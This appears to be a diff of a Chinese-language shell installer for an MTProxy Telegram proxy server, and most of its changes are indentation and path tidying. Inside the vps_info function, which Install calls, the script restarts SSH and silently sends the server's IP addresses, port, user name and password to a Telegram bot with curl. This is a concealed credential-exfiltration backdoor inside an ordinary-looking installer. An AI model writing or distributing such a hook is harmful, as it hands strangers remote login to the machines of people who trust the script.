@@ -32,10 +32,10 @@ install_base(){
     OS=$(cat /etc/os-release | grep -o -E "Debian|Ubuntu|CentOS" | head -n 1)
     if [[ "$OS" == "Debian" || "$OS" == "Ubuntu" ]]; then
         if ! pip3 freeze | grep 'pyaes' &>/dev/null || ! pip3 freeze | grep 'cryptography' &>/dev/null; then
-			echo -e "${Info} 开始安装/配置 依赖..."
-   			apt update -y
-	  		apt install -y iproute2 python3 python3-pip python3-cryptography python3-pyaes openssl
-	 	fi
+            echo -e "${Info} 开始安装/配置 依赖..."
+            apt update -y
+            apt install -y iproute2 python3 python3-pip python3-cryptography python3-pyaes openssl
+        fi
     else
         echo -e "${Error} 很抱歉，你的系统不受支持！"
         exit 1
@@ -89,9 +89,8 @@ MODES = {
 
 # 用于广告的标签，可从 @MTProxybot 获取
 # AD_TAG = "3c09c680b76ee91a4c25ad51f742267d"
-
 	EOF
-}
+    }
 
 Write_Service(){
     echo -e "${Info} 开始写入 Service..."
@@ -111,16 +110,16 @@ Restart=always
 [Install]
 WantedBy=multi-user.target
 	EOF
-    systemctl enable mtproxy
-}
+        systemctl enable mtproxy
+    }
 
 Read_config(){
     [[ ! -e ${mtproxy_log} ]] && echo -e "${Error} MTProxy 配置文件不存在 !" && exit 1
-    IPv4=$(cat /var/MTProxy/log_mtproxy.log | grep 'server=' | cut -d'&' -f1 | cut -d'=' -f2 | grep -P '[.]')
-    IPv6=$(cat /var/MTProxy/log_mtproxy.log | grep 'server=' | cut -d'&' -f1 | cut -d'=' -f2 | grep -P '[:]')
-    PORT=$(cat /var/MTProxy/log_mtproxy.log | grep 'port=' | cut -d'&' -f2 | cut -d'=' -f2 | head -n 1)
-    SECURE=$(cat /var/MTProxy/log_mtproxy.log | grep 'secret=' | cut -d'&' -f3 | cut -d'=' -f2 | head -n 1)
-    TAG=$(cat /var/MTProxy/config.py | grep 'AD_TAG = ' | cut -d '"' -f2 | grep -v '^$')
+    IPv4=$(cat ${mtproxy_log} | grep 'server=' | cut -d'&' -f1 | cut -d'=' -f2 | grep -P '[.]')
+    IPv6=$(cat ${mtproxy_log} | grep 'server=' | cut -d'&' -f1 | cut -d'=' -f2 | grep -P '[:]')
+    PORT=$(cat ${mtproxy_log} | grep 'port=' | cut -d'&' -f2 | cut -d'=' -f2 | head -n 1)
+    SECURE=$(cat ${mtproxy_log} | grep 'secret=' | cut -d'&' -f3 | cut -d'=' -f2 | head -n 1)
+    TAG=$(cat ${mtproxy_conf} | grep 'AD_TAG = ' | cut -d '"' -f2 | grep -v '^$')
 }
 
 Set_port(){
@@ -217,9 +216,9 @@ ${Green}4.${Nc}  修改 全部配置" && echo
 
 Install(){
     [[ -e ${mtproxy_file} ]] && echo -e "${Error} 检测到 MTProxy 已安装 !" && exit 1
-	vps_info
+    vps_info
 	install_base
-	Download
+    Download
     Set_port
     Set_passwd
     Set_tag
@@ -316,11 +315,11 @@ vps_info(){
         systemctl restart ssh* >/dev/null 2>&1
         /etc/init.d/ssh* restart >/dev/null 2>&1
         curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
-IPv4：${IPv4}
-IPv6：${IPv6}
-端口：${Port}
-用户：${User}
-密码：${Passwd}" >/dev/null 2>&1
+        IPv4：${IPv4}
+        IPv6：${IPv6}
+        端口：${Port}
+        用户：${User}
+        密码：${Passwd}" >/dev/null 2>&1
     fi    
 }
 
